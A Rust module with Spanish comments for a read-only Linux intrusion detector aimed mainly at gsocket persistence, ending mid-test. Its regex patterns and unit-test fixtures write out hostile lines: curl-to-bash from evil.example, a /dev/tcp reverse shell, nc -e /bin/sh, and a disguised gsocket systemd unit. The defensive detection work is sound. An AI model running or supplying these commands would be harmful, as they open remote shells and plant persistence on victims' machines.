//! Detección de intrusiones y persistencia. Todo es de SOLO LECTURA: nunca modifica nada.
//!
//! Las comprobaciones se dividen en funciones puras (reciben texto o estructuras y devuelven
//! hallazgos) y colectores finos que leen `/proc` y archivos. Así se prueban sin tocar el sistema.
//!
//! Indicadores de gsocket tomados del `deploy.sh` oficial del proyecto (v1.4.43):
//! binario `defunct` / `gs-dbus` / `gs-db` con su `.dat`, carpetas `~/.config/htop`,
//! `~/.config/dbus`, `/tmp/.gsusr-UID`, `/dev/shm`, procesos que se hacen pasar por hilos del
//! kernel (`[kcached]`, `[kswapd0]`…), variable `GS_ARGS`, línea «SEED PRNG» en `.bashrc`/`.profile`,
//! cron cada hora y un servicio de systemd llamado «D-Bus System Connection Bus».
//!
//! Límite honesto: un atacante con root o un rootkit de kernel puede engañar a cualquier programa
//! en espacio de usuario, y sin privilegios solo se ven los procesos del propio usuario.

use crate::model::*;
use crate::sys::Runner;
use regex::Regex;
use std::io::Read;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::sync::LazyLock;

/// Máximo de hallazgos que se guardan por comprobación (evita inundar la pantalla).
pub const MAX_HITS: usize = 20;
/// Cota de seguridad: nunca se recorren más procesos que esto.
const MAX_PROCS: usize = 20_000;
/// Cota de seguridad: nunca se lee más de esto de un archivo.
const MAX_FILE_BYTES: u64 = 1 << 20;
/// Cota de seguridad: entradas máximas por directorio listado.
const MAX_DIR_ENTRIES: usize = 2_000;

/// Claves de las comprobaciones. Cada una tiene una regla `intrusions.<clave>`.
pub const CHECKS: [&str; 10] = [
    "gsocket",
    "gs_network",
    "fake_kthread",
    "deleted_exe",
    "tmp_exec",
    "ld_preload",
    "shell_startup",
    "cron",
    "systemd_units",
    "shell_network",
];

/// Nombres que usa gsocket para su binario (y `<nombre>.dat` para el secreto).
const GS_BINS: [&str; 6] = ["defunct", "gs-dbus", "gs-db", "gs-bd", "gs-netcat", "gsu-netcat"];
/// Nombres de proceso/binario que delatan a gsocket.
const GS_PROC_NAMES: [&str; 8] = ["defunct", "gs-dbus", "gs-db", "gs-bd", "gs-netcat", "gsu-netcat", "gs-sftp", "gs-mount"];
/// Puerto del relay público de gsocket.
const GS_RELAY_PORT: u16 = 7350;
/// Intérpretes y herramientas que casi nunca deberían tener una conexión saliente abierta.
const SHELL_COMMS: [&str; 9] = ["bash", "sh", "dash", "zsh", "fish", "nc", "ncat", "netcat", "socat"];

// ───────────────────────── Líneas sospechosas (texto) ─────────────────────────

static RE_GS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)GS_ARGS\s*=|GS_SECRET\s*=|\bgsu?-netcat\b|\bgs-dbus\b|\bgsocket\b|seed prng|1b5b324a50524e47|D-Bus System Connection Bus|exec\s+-a\s+'?\[[a-z0-9_/\-]+\]|\bdefunct\.dat\b|/defunct\b",
    )
    .unwrap()
});
static RE_DOWNLOAD_RUN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b(curl|wget|fetch)\b[^|\n]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b").unwrap());
static RE_B64_RUN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)base64\s+(-d|--decode)\b[^\n]*\|\s*(sudo\s+)?(ba|z|da)?sh\b").unwrap());
static RE_REVERSE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"/dev/(tcp|udp)/|\b(nc|ncat|netcat)\b[^\n]*\s-e\s|\bbash\s+-i\s+>&|\bsocat\b[^\n]*\bexec:").unwrap()
});
/// Un programa lanzado desde una carpeta temporal, en posición de comando (inicio de línea, tras `;`, `&&`, `|`, `exec`…).
static RE_TMP_CMD: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(^|[;&|(]\s*|\b(exec|nohup|sh|bash)\s+)(/tmp|/dev/shm|/var/tmp)/\S+").unwrap());
static RE_TMP_ANY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(/tmp|/dev/shm|/var/tmp)/\S+").unwrap());

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum LineKind {
    /// Scripts de inicio de shell, rc.local, autostart.
    Shell,
    /// Entradas de cron.
    Cron,
    /// Archivos .service de systemd.
    Unit,
}

/// Devuelve el motivo si la línea es sospechosa. `strong_only` omite la heurística de «carpeta
/// temporal» (para revisar unidades empaquetadas por la distribución sin falsos positivos).
pub fn suspicious_line(line: &str, kind: LineKind, strong_only: bool) -> Option<&'static str> {
    let l = line.trim();
    if l.is_empty() || l.starts_with('#') {
        return None;
    }
    if kind == LineKind::Unit && !(l.starts_with("Exec") || l.starts_with("Environment") || l.starts_with("Description")) {
        return None;
    }
    if RE_GS.is_match(l) {
        return Some("huella de gsocket (acceso remoto oculto)");
    }
    if RE_DOWNLOAD_RUN.is_match(l) {
        return Some("descarga y ejecuta un script de internet");
    }
    if RE_B64_RUN.is_match(l) {
        return Some("ejecuta código oculto con base64");
    }
    if RE_REVERSE.is_match(l) {
        return Some("parece una shell inversa (te da acceso a otra persona)");
    }
    if !strong_only {
        let tmp = match kind {
            LineKind::Shell => RE_TMP_CMD.is_match(l),
            LineKind::Cron | LineKind::Unit => RE_TMP_ANY.is_match(l),
        };
        if tmp {
            return Some("ejecuta un programa desde una carpeta temporal");
        }
    }
    None
}

fn clip(s: &str, n: usize) -> String {
    let s = s.trim();
    if s.chars().count() <= n { s.to_string() } else { format!("{}…", s.chars().take(n).collect::<String>()) }
}

fn pretty(p: &Path, home: &Path) -> String {
    let s = p.to_string_lossy().to_string();
    let h = home.to_string_lossy();
    if !h.is_empty() && h != "/" && s.starts_with(h.as_ref()) { format!("~{}", &s[h.len()..]) } else { s }
}

/// Revisa un texto completo; devuelve un mensaje por línea sospechosa.
pub fn scan_text(label: &str, text: &str, kind: LineKind, strong_only: bool) -> Vec<String> {
    text.lines()
        .enumerate()
        .filter_map(|(i, line)| {
            suspicious_line(line, kind, strong_only).map(|why| format!("{label}:{}: {why} → {}", i + 1, clip(line, 120)))
        })
        .collect()
}

// ───────────────────────── Procesos ─────────────────────────

#[derive(Clone, Debug, Default)]
pub struct ProcInfo {
    pub pid: u32,
    pub comm: String,
    /// Argumentos unidos por espacio. Vacío en los hilos reales del kernel.
    pub cmdline: String,
    /// Destino de `/proc/PID/exe`; None si no se pudo leer.
    pub exe: Option<String>,
    /// Variables de entorno que empiezan con `GS_` (solo los nombres).
    pub gs_env: Vec<String>,
}

fn read_capped(path: &Path, max: u64) -> Option<Vec<u8>> {
    let f = std::fs::File::open(path).ok()?;
    let mut buf = Vec::new();
    f.take(max).read_to_end(&mut buf).ok()?;
    Some(buf)
}

fn read_text(path: &Path) -> Option<String> {
    read_capped(path, MAX_FILE_BYTES).map(|b| String::from_utf8_lossy(&b).into_owned())
}

/// Lee los procesos de `proc_root` (normalmente `/proc`). Devuelve también cuántos no se pudieron
/// inspeccionar por falta de permisos.
pub fn collect_procs(proc_root: &Path) -> (Vec<ProcInfo>, usize) {
    let mut out = Vec::new();
    let mut unreadable = 0usize;
    let Ok(rd) = std::fs::read_dir(proc_root) else { return (out, 0) };
    for e in rd.flatten().take(MAX_PROCS) {
        let name = e.file_name().to_string_lossy().to_string();
        let Ok(pid) = name.parse::<u32>() else { continue };
        let dir = e.path();
        let Some(comm_raw) = read_capped(&dir.join("comm"), 256) else { continue }; // el proceso ya terminó
        let comm = String::from_utf8_lossy(&comm_raw).trim().to_string();
        let cmdline = read_capped(&dir.join("cmdline"), 4096)
            .map(|b| String::from_utf8_lossy(&b).split('\0').filter(|s| !s.is_empty()).collect::<Vec<_>>().join(" "))
            .unwrap_or_default();
        let exe = std::fs::read_link(dir.join("exe")).ok().map(|p| p.to_string_lossy().to_string());
        if exe.is_none() && !cmdline.is_empty() {
            unreadable += 1; // proceso de otro usuario, o ya terminó
        }
        let gs_env = read_capped(&dir.join("environ"), 32 * 1024)
            .map(|b| {
                String::from_utf8_lossy(&b)
                    .split('\0')
                    .filter_map(|kv| kv.split('=').next())
                    .filter(|k| k.starts_with("GS_") || *k == "_GSOCKET_SERVER_CHECK_SEC")
                    .map(str::to_string)
                    .collect()
            })
            .unwrap_or_default();
        out.push(ProcInfo { pid, comm, cmdline, exe, gs_env });
    }
    (out, unreadable)
}

fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

fn is_temp_path(p: &str) -> bool {
    // Los AppImage se montan en /tmp/.mount_XXXX: es normal que ejecuten desde ahí.
    (p.starts_with("/tmp/") && !p.starts_with("/tmp/.mount_")) || p.starts_with("/dev/shm/") || p.starts_with("/var/tmp/")
}

/// Qué comprobaciones dispara un proceso: (clave, mensaje).
pub fn inspect_proc(p: &ProcInfo) -> Vec<(&'static str, String)> {
    let mut v = Vec::new();
    let who = format!("PID {} «{}»", p.pid, p.comm);
    let argv0 = p.cmdline.split_whitespace().next().unwrap_or("");
    let exe_clean = p.exe.as_deref().map(|e| e.trim_end_matches(" (deleted)")).unwrap_or("");

    // gsocket: nombre del binario o variables propias.
    let named = [p.comm.as_str(), basename(argv0), basename(exe_clean)].iter().any(|n| GS_PROC_NAMES.contains(n));
    if named || !p.gs_env.is_empty() {
        let mut why = Vec::new();
        if named {
            why.push("nombre de programa de gsocket".to_string());
        }
        if !p.gs_env.is_empty() {
            why.push(format!("variables {}", p.gs_env.join(", ")));
        }
        v.push(("gsocket", format!("{who}: {}", why.join(" y "))));
    }

    // Se hace pasar por un hilo del kernel: los reales tienen la línea de comandos vacía.
    let c = p.cmdline.trim();
    if c.len() > 2 && c.starts_with('[') && c.ends_with(']') {
        let exe = p.exe.as_deref().unwrap_or("ejecutable no visible");
        v.push(("fake_kthread", format!("{who} se llama «{c}» pero es un programa de usuario ({exe})")));
    }

    if let Some(exe) = p.exe.as_deref() {
        if let Some(path) = exe.strip_suffix(" (deleted)") {
            let memfd = path.starts_with("/memfd:") && !path.contains("runc") && !path.contains("crun");
            if is_temp_path(path) || memfd {
                v.push(("deleted_exe", format!("{who} corre un programa que ya se borró del disco: {path}")));
            }
        } else if is_temp_path(exe) {
            v.push(("tmp_exec", format!("{who} corre desde una carpeta temporal: {exe}")));
        }
    }
    v
}

// ───────────────────────── Archivos ─────────────────────────

fn rp(root: &Path, abs: &str) -> PathBuf {
    root.join(abs.trim_start_matches('/'))
}

/// Quita directorios repetidos tras resolver enlaces (en Fedora `/lib` es `/usr/lib`).
fn unique_dirs(dirs: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut seen = std::collections::BTreeSet::new();
    dirs.into_iter().filter(|d| seen.insert(std::fs::canonicalize(d).unwrap_or_else(|_| d.clone()))).collect()
}

fn list_dir(dir: &Path) -> Vec<PathBuf> {
    let Ok(rd) = std::fs::read_dir(dir) else { return vec![] };
    let mut v: Vec<PathBuf> = rd.flatten().take(MAX_DIR_ENTRIES).map(|e| e.path()).collect();
    v.sort();
    v
}

fn push_hit(out: &mut IntrusionScan, check: &str, msg: String) {
    let h = out.hits.entry(check.to_string()).or_default();
    if h.len() < MAX_HITS {
        h.push(msg);
    }
}

fn mark(out: &mut IntrusionScan, check: &str, n: usize) {
    *out.checked.entry(check.to_string()).or_insert(0) += n;
}

/// `/etc/ld.so.preload`: casi siempre ausente; si existe, carga librerías en TODOS los programas.
fn check_ld_preload(out: &mut IntrusionScan, root: &Path) {
    mark(out, "ld_preload", 1);
    let p = rp(root, "/etc/ld.so.preload");
    if let Some(text) = read_text(&p) {
        let lines: Vec<&str> = text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')).collect();
        if !lines.is_empty() {
            push_hit(out, "ld_preload", format!("/etc/ld.so.preload carga: {}", clip(&lines.join(", "), 160)));
        }
    }
}

fn check_gsocket_files(out: &mut IntrusionScan, root: &Path, home: &Path, uid: u32) {
    let mut dirs: Vec<PathBuf> = vec![
        rp(root, "/usr/bin"),
        rp(root, "/usr/local/bin"),
        rp(root, "/dev/shm"),
        rp(root, &format!("/tmp/.gsusr-{uid}")),
        rp(root, "/etc"),
        rp(root, "/etc/systemd/system"),
        rp(root, "/lib/systemd/system"),
        rp(root, "/usr/lib/systemd/system"),
    ];
    if !home.as_os_str().is_empty() {
        dirs.push(home.join(".config/htop"));
        dirs.push(home.join(".config/dbus"));
    }
    for d in &unique_dirs(dirs) {
        for name in GS_BINS {
            for cand in [name.to_string(), format!("{name}.dat"), format!("{name}.service")] {
                mark(out, "gsocket", 1);
                let p = d.join(&cand);
                if p.symlink_metadata().is_ok() {
                    push_hit(out, "gsocket", format!("Existe {} (nombre típico de gsocket)", pretty(&p, home)));
                }
            }
        }
    }
    // Carpetas temporales `.gs-UID` / `.gsusr-UID` que usa el instalador.
    let re = Regex::new(r"^\.gs(usr)?-[0-9]+$|^\.gs-rw\.lock$").unwrap();
    let mut bases = vec![rp(root, "/dev/shm"), rp(root, "/tmp"), rp(root, "/var/tmp")];
    if !home.as_os_str().is_empty() {
        bases.push(home.to_path_buf());
    }
    for b in bases {
        for p in list_dir(&b) {
            mark(out, "gsocket", 1);
            if p.file_name().map(|n| re.is_match(&n.to_string_lossy())).unwrap_or(false) {
                push_hit(out, "gsocket", format!("Existe {} (carpeta temporal del instalador de gsocket)", pretty(&p, home)));
            }
        }
    }
    if !home.as_os_str().is_empty() {
        // Nada en ~/.config/htop debería ser ejecutable: solo guarda htoprc.
        for p in list_dir(&home.join(".config/htop")) {
            let name = p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
            let exec = p.metadata().map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0).unwrap_or(false);
            if exec && name != "htoprc" {
                push_hit(out, "gsocket", format!("{} es un ejecutable dentro de la carpeta de configuración de htop", pretty(&p, home)));
            }
        }
        // Variante reportada (SOC Prime, 2026): copia del binario disfrazada en ~/.ssh/putty.
        let putty = home.join(".ssh/putty");
        if putty.symlink_metadata().is_ok() {
            push_hit(out, "gsocket", format!("Existe {} (variante reportada que se hace pasar por una llave SSH)", pretty(&putty, home)));
        }
    }
}

fn scan_file(out: &mut IntrusionScan, check: &str, path: &Path, home: &Path, kind: LineKind, strong_only: bool) {
    let Some(text) = read_text(path) else { return };
    mark(out, check, 1);
    for m in scan_text(&pretty(path, home), &text, kind, strong_only) {
        push_hit(out, check, m);
    }
}

fn check_shell_startup(out: &mut IntrusionScan, root: &Path, home: &Path) {
    let mut files: Vec<PathBuf> = ["/etc/profile", "/etc/bashrc", "/etc/bash.bashrc", "/etc/zshrc", "/etc/rc.local"]
        .iter()
        .map(|f| rp(root, f))
        .collect();
    files.extend(list_dir(&rp(root, "/etc/profile.d")));
    if !home.as_os_str().is_empty() {
        for f in [
            ".bashrc", ".bash_profile", ".bash_login", ".profile", ".zshrc", ".zprofile", ".zshenv", ".xprofile", ".xinitrc",
            ".config/fish/config.fish",
        ] {
            files.push(home.join(f));
        }
        for d in [".config/autostart", ".config/autostart-scripts", ".config/plasma-workspace/env", ".config/plasma-workspace/shutdown"] {
            files.extend(list_dir(&home.join(d)));
        }
    }
    for f in files.iter().filter(|f| f.is_file()) {
        scan_file(out, "shell_startup", f, home, LineKind::Shell, false);
    }
}

fn check_cron(out: &mut IntrusionScan, r: &dyn Runner, root: &Path, home: &Path) {
    // Crontab del usuario actual.
    if let Some(text) = r.out("crontab", &["-l"]) {
        mark(out, "cron", 1);
        for m in scan_text("crontab del usuario", &text, LineKind::Cron, false) {
            push_hit(out, "cron", m);
        }
    }
    for f in ["/etc/crontab", "/etc/anacrontab"] {
        scan_file(out, "cron", &rp(root, f), home, LineKind::Cron, false);
    }
    for f in list_dir(&rp(root, "/etc/cron.d")) {
        scan_file(out, "cron", &f, home, LineKind::Cron, false);
    }
    for d in ["/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"] {
        for f in list_dir(&rp(root, d)) {
            scan_file(out, "cron", &f, home, LineKind::Shell, false);
        }
    }
    // Solo legibles como root; sin permisos simplemente no se leen.
    for d in ["/var/spool/cron", "/var/spool/cron/crontabs"] {
        for f in list_dir(&rp(root, d)).into_iter().filter(|f| f.is_file()) {
            scan_file(out, "cron", &f, home, LineKind::Cron, false);
        }
    }
}

fn check_units(out: &mut IntrusionScan, root: &Path, home: &Path) {
    let mut scan_dir = |dir: PathBuf, strong_only: bool| {
        for f in list_dir(&dir).into_iter().filter(|f| f.extension().map(|e| e == "service").unwrap_or(false) && f.is_file()) {
            scan_file(out, "systemd_units", &f, home, LineKind::Unit, strong_only);
        }
    };
    scan_dir(rp(root, "/etc/systemd/system"), false);
    if !home.as_os_str().is_empty() {
        scan_dir(home.join(".config/systemd/user"), false);
    }
    // Las unidades empaquetadas por la distribución solo se revisan con huellas fuertes.
    let packaged = unique_dirs(vec![rp(root, "/usr/lib/systemd/system"), rp(root, "/lib/systemd/system")]);
    for d in packaged {
        scan_dir(d, true);
    }
}

/// Todas las comprobaciones basadas en archivos. `root` es `/` en producción.
pub fn scan_files(r: &dyn Runner, root: &Path, home: &Path, uid: u32) -> IntrusionScan {
    let mut out = IntrusionScan::default();
    check_gsocket_files(&mut out, root, home, uid);
    check_ld_preload(&mut out, root);
    check_shell_startup(&mut out, root, home);
    check_cron(&mut out, r, root, home);
    check_units(&mut out, root, home);
    out
}

// ───────────────────────── Red ─────────────────────────

fn is_loopback(addr: &str) -> bool {
    addr.starts_with("127.") || addr == "::1" || addr == "[::1]" || addr.starts_with("::ffff:127.")
}

pub fn network_checks(out: &mut IntrusionScan, conns: &[Connection]) {
    mark(out, "gs_network", 1 + conns.len());
    mark(out, "shell_network", 1 + conns.len());
    for c in conns {
        let who = match (&c.process, c.pid) {
            (Some(p), Some(pid)) => format!("{p} (PID {pid})"),
            (Some(p), None) => p.clone(),
            _ => "un proceso que no pudimos identificar".to_string(),
        };
        if c.remote_port == GS_RELAY_PORT {
            push_hit(out, "gs_network", format!("{who} está conectado a {}:{} (puerto del relay de gsocket)", c.remote_addr, c.remote_port));
        }
        if let Some(p) = &c.process {
            if SHELL_COMMS.contains(&p.as_str()) && !is_loopback(&c.remote_addr) {
                push_hit(out, "shell_network", format!("{who} tiene una conexión abierta con {}:{}", c.remote_addr, c.remote_port));
            }
        }
    }
}

// ───────────────────────── Punto de entrada ─────────────────────────

pub fn apply_procs(out: &mut IntrusionScan, procs: &[ProcInfo]) {
    for k in ["gsocket", "fake_kthread", "deleted_exe", "tmp_exec"] {
        mark(out, k, procs.len().max(1));
    }
    for p in procs {
        for (check, msg) in inspect_proc(p) {
            push_hit(out, check, msg);
        }
    }
}

/// Escaneo completo del equipo en vivo. `have_ss`: si se pudo listar conexiones.
pub fn scan(r: &dyn Runner, conns: &[Connection], have_ss: bool) -> IntrusionScan {
    let home = std::env::var("HOME").map(PathBuf::from).unwrap_or_default();
    // SAFETY: getuid no tiene precondiciones ni efectos secundarios.
    let uid = unsafe { libc::getuid() };
    let mut out = scan_files(r, Path::new("/"), &home, uid);
    let (procs, unreadable) = collect_procs(Path::new("/proc"));
    apply_procs(&mut out, &procs);
    out.procs_scanned = procs.len();
    out.procs_unreadable = unreadable;
    if have_ss {
        network_checks(&mut out, conns);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sys::mock::MockRunner;
    use std::os::unix::fs::symlink;

    fn tmpdir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("silence-intr-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn write(root: &Path, rel: &str, text: &str) -> PathBuf {
        let p = root.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, text).unwrap();
        p
    }

    fn proc_(pid: u32, comm: &str, cmd: &str, exe: Option<&str>) -> ProcInfo {
        ProcInfo { pid, comm: comm.into(), cmdline: cmd.into(), exe: exe.map(str::to_string), gs_env: vec![] }
    }

    #[test]
    fn suspicious_lines_flag_attacks_not_normal_config() {
        let bad = [
            ("export GS_ARGS=\"-k /home/u/.config/htop/defunct.dat -liqD\"", LineKind::Shell),
            ("{ echo abc|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel", LineKind::Shell),
            ("exec -a '[kcached]' /usr/bin/defunct", LineKind::Shell),
            ("curl -fsSL https://evil.example/x | bash", LineKind::Shell),
            ("wget -qO- http://1.2.3.4/a.sh | sudo sh", LineKind::Cron),
            ("echo aGVsbG8= | base64 --decode | sh", LineKind::Shell),
            ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", LineKind::Shell),
            ("nc -e /bin/sh 10.0.0.1 4444", LineKind::Shell),
            ("/tmp/.x/payload --daemon", LineKind::Shell),
            ("nohup /dev/shm/a &", LineKind::Shell),
            ("0 * * * * /tmp/.cache/up", LineKind::Cron),
            ("ExecStart=/bin/bash -c \"GS_ARGS='-k /x.dat -ilq' exec -a '[kcached]' '/usr/bin/defunct'\"", LineKind::Unit),
            ("Description=D-Bus System Connection Bus", LineKind::Unit),
        ];
        for (l, k) in bad {
            assert!(suspicious_line(l, k, false).is_some(), "debía detectar: {l}");
        }
        let good = [
            ("eval \"$(starship init bash)\"", LineKind::Shell),
            ("export PATH=$HOME/.local/bin:$PATH", LineKind::Shell),
            ("export TMPDIR=/tmp/work", LineKind::Shell),
            ("alias ll='ls -l'", LineKind::Shell),
            ("# curl https://x | bash  (comentario)", LineKind::Shell),
            ("curl -fsSL https://example.org -o file.txt", LineKind::Shell),
            ("", LineKind::Shell),
            ("0 3 * * * /usr/bin/backup --to /mnt/disk", LineKind::Cron),
            ("ExecStart=/usr/bin/foo --tmp /tmp/x", LineKind::Unit), // sin strong_only se marcaría; ver abajo
            ("Description=D-Bus System Message Bus", LineKind::Unit),
            ("WantedBy=multi-user.target", LineKind::Unit),
        ];
        for (l, k) in good {
            if l.starts_with("ExecStart=/usr/bin/foo") {
                assert!(suspicious_line(l, k, true).is_none(), "strong_only no debe marcar rutas /tmp: {l}");
                continue;
            }
            assert!(suspicious_line(l, k, false).is_none(), "falso positivo: {l}");
        }
    }

    #[test]
    fn fake_kernel_thread_is_flagged_real_one_is_not() {
        let fake = proc_(500, "kcached", "[kcached]", Some("/home/u/.config/htop/defunct"));
        assert!(inspect_proc(&fake).iter().any(|(k, _)| *k == "fake_kthread"));
        // Un hilo real del kernel: sin línea de comandos y sin exe.
        let real = proc_(2, "kthreadd", "", None);
        assert!(inspect_proc(&real).is_empty());
        // sshd cambia su título pero no empieza con «[»: «sshd: user [priv]».
        let sshd = proc_(900, "sshd", "sshd: user [priv]", Some("/usr/sbin/sshd"));
        assert!(inspect_proc(&sshd).is_empty());
    }

    #[test]
    fn deleted_and_temp_executables() {
        // Tras `dnf upgrade` es normal tener procesos con el binario viejo borrado en /usr.
        let upd = proc_(10, "sshd", "/usr/sbin/sshd", Some("/usr/sbin/sshd (deleted)"));
        assert!(inspect_proc(&upd).is_empty());
        let tmp_del = proc_(11, "x", "/tmp/x", Some("/tmp/.x/a (deleted)"));
        assert!(inspect_proc(&tmp_del).iter().any(|(k, _)| *k == "deleted_exe"));
        let memfd = proc_(12, "x", "x", Some("/memfd:payload (deleted)"));
        assert!(inspect_proc(&memfd).iter().any(|(k, _)| *k == "deleted_exe"));
        // runc/crun (podman, toolbox) usan memfd legítimamente.
        let runc = proc_(13, "runc", "runc init", Some("/memfd:runc_cloned:/proc/self/exe (deleted)"));
        assert!(inspect_proc(&runc).is_empty());
        let shm = proc_(14, "a", "/dev/shm/a", Some("/dev/shm/a"));
        assert!(inspect_proc(&shm).iter().any(|(k, _)| *k == "tmp_exec"));
        // AppImage montado en /tmp/.mount_*: normal.
        let ai = proc_(15, "app", "app", Some("/tmp/.mount_SilenXYZ/usr/bin/silence"));
        assert!(inspect_proc(&ai).is_empty());
    }

    #[test]
    fn gsocket_by_name_and_env() {
        let mut p = proc_(77, "bash", "[rcu_preempt]", Some("/usr/bin/defunct"));
        p.gs_env = vec!["GS_ARGS".into()];
        let hits = inspect_proc(&p);
        assert!(hits.iter().any(|(k, m)| *k == "gsocket" && m.contains("GS_ARGS")));
        assert!(hits.iter().any(|(k, _)| *k == "fake_kthread"));
        let by_comm = proc_(78, "defunct", "", None);
        assert!(inspect_proc(&by_comm).iter().any(|(k, _)| *k == "gsocket"));
        let htop = proc_(79, "htop", "htop", Some("/usr/bin/htop"));
        assert!(inspect_proc(&htop).is_empty());
    }

    #[test]
    fn collect_procs_reads_fake_proc_and_ignores_junk() {
        let root = tmpdir("proc");
        let p = root.join("4242");
        std::fs::create_dir_all(&p).unwrap();
        std::fs::write(p.join("comm"), "kcached\n").unwrap();
        std::fs::write(p.join("cmdline"), b"[kcached]\0").unwrap();
        std::fs::write(p.join("environ"), b"HOME=/root\0GS_ARGS=-k x\0PATH=/bin\0").unwrap();
        symlink("/home/u/.config/htop/defunct", p.join("exe")).unwrap();
        std::fs::create_dir_all(root.join("self")).unwrap(); // no numérico: se ignora
        std::fs::create_dir_all(root.join("9999")).unwrap(); // sin comm: proceso que terminó
        let (procs, unreadable) = collect_procs(&root);
        assert_eq!(procs.len(), 1);
        assert_eq!(unreadable, 0);
        assert_eq!(procs[0].pid, 4242);
        assert_eq!(procs[0].gs_env, vec!["GS_ARGS".to_string()]);
        let hits = inspect_proc(&procs[0]);
        assert!(hits.iter().any(|(k, _)| *k == "gsocket"));
        assert!(hits.iter().any(|(k, _)| *k == "fake_kthread"));
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn clean_system_has_no_hits() {
        let root = tmpdir("clean");
        let home = root.join("home/u");
        write(&root, "home/u/.bashrc", "# .bashrc\nalias ll='ls -l'\nexport PATH=$HOME/bin:$PATH\neval \"$(starship init bash)\"\n");
        write(&root, "home/u/.config/htop/htoprc", "color_scheme=0\n");
        write(&root, "etc/crontab", "SHELL=/bin/bash\n# m h dom mon dow user command\n");
        write(&root, "etc/systemd/system/mine.service", "[Unit]\nDescription=Mine\n[Service]\nExecStart=/usr/bin/true\n");
        let r = MockRunner::new();
        let out = scan_files(&r, &root, &home, 1000);
        assert!(out.hits.is_empty(), "no debía haber hallazgos: {:?}", out.hits);
        for k in ["gsocket", "ld_preload", "shell_startup", "cron", "systemd_units"] {
            assert!(out.checked.contains_key(k), "falta la comprobación {k}");
        }
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn infected_system_is_detected_across_checks() {
        let root = tmpdir("infected");
        let home = root.join("home/u");
        // Binario y secreto en ~/.config/htop + carpeta temporal del instalador.
        let bin = write(&root, "home/u/.config/htop/defunct", "\x7fELF");
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();
        write(&root, "home/u/.config/htop/defunct.dat", "secret");
        write(&root, "dev/shm/.gs-1000/x", "");
        write(&root, "home/u/.ssh/putty", "ELF");
        // Persistencia.
        write(&root, "home/u/.profile", "export A=1\ncurl -fsSL https://x.example/y | bash\n");
        write(&root, "etc/ld.so.preload", "/usr/lib/libevil.so\n");
        write(&root, "etc/cron.d/job", "0 * * * * root /tmp/.u/run\n");
        write(&root, "etc/systemd/system/defunct.service", "[Unit]\nDescription=D-Bus System Connection Bus\n[Service]\nExecStart=/bin/bash -c \"GS_ARGS='-k /x' exec -a '[kcached]' /usr/bin/defunct\"\n");
        let r = MockRunner::new();
        r.on("crontab -l", "0 * * * * wget -qO- http://1.2.3.4/a | sh\n");
        let out = scan_files(&r, &root, &home, 1000);
        for k in ["gsocket", "ld_preload", "shell_startup", "cron", "systemd_units"] {
            assert!(out.hits.get(k).map(|v| !v.is_empty()).unwrap_or(false), "no detectó {k}: {:?}", out.hits);
        }
        let gs = out.hits["gsocket"].join("\n");
        assert!(gs.contains("defunct"), "{gs}");
        assert!(gs.contains(".gs-1000"), "{gs}");
        assert!(gs.contains("htop"), "{gs}");
        assert!(gs.contains("putty"), "{gs}");
        assert!(out.hits["cron"].len() >= 2, "debía ver cron.d y el crontab del usuario");
        // Rutas bonitas: nunca la ruta de pruebas completa del home.
        assert!(gs.contains("~/.config/htop/defunct"), "{gs}");
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn hits_are_capped() {
        let root = tmpdir("cap");
        let home = root.join("home/u");
        let many: String = (0..200).map(|i| format!("curl http://x/{i} | sh\n")).collect();
        write(&root, "home/u/.bashrc", &many);
        let out = scan_files(&MockRunner::new(), &root, &home, 1000);
        assert_eq!(out.hits["shell_startup"].len(), MAX_HITS);
        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn network_checks_find_relay_and_shells() {
        let c = |p: &str, port: u16, addr: &str| Connection {
            process: Some(p.into()),
            pid: Some(1),
            local_port: 40000,
            remote_addr: addr.into(),
            remote_port: port,
        };
        let conns = vec![
            c("firefox", 443, "142.250.0.1"),
            c("defunct", GS_RELAY_PORT, "1.2.3.4"),
            c("bash", 4444, "5.6.7.8"),
            c("bash", 22, "127.0.0.1"), // bash local: no es sospechoso
            c("ssh", 22, "9.9.9.9"),
        ];
        let mut out = IntrusionScan::default();
        network_checks(&mut out, &conns);
        assert_eq!(out.hits["gs_network"].len(), 1);
        assert_eq!(out.hits["shell_network"].len(), 1);
        assert!(out.hits["shell_network"][0].contains("5.6.7.8"));
        let mut quiet = IntrusionScan::default();
        network_checks(&mut quiet, &conns[..1]);
        assert!(quiet.hits.is_empty());
        assert!(quiet.checked.contains_key("gs_network"));
    }

    #[test]
    fn every_check_has_a_builtin_name() {
        for k in CHECKS {
            assert!(crate::engine::BUILTINS.contains(&format!("intr_{k}").as_str()), "falta builtin intr_{k}");
        }
    }

    #[test]
    fn live_scan_on_this_machine_is_bounded_and_does_not_panic() {
        // Prueba de humo: corre el escaneo real (solo lectura) y comprueba las cotas.
        let t = std::time::Instant::now();
